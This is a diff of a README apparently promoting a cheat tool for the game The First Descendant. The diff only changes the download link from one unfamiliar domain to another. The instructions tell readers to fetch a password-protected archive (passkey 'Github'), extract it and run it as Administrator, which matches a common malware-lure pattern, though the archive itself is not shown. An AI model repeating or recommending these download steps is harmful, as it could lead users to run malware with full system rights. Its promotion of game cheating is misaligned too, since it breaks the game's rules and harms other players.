@@ -6,7 +6,7 @@ The First Descendant hack with aimbot, ESP, wallhack, no recoil, infinite ammo, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular tools like **TFD Cheat**, **Descendant Menu**, and **Nexon Mod*
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch The First Descendant.
 4. Run the hack **as Administrator**.
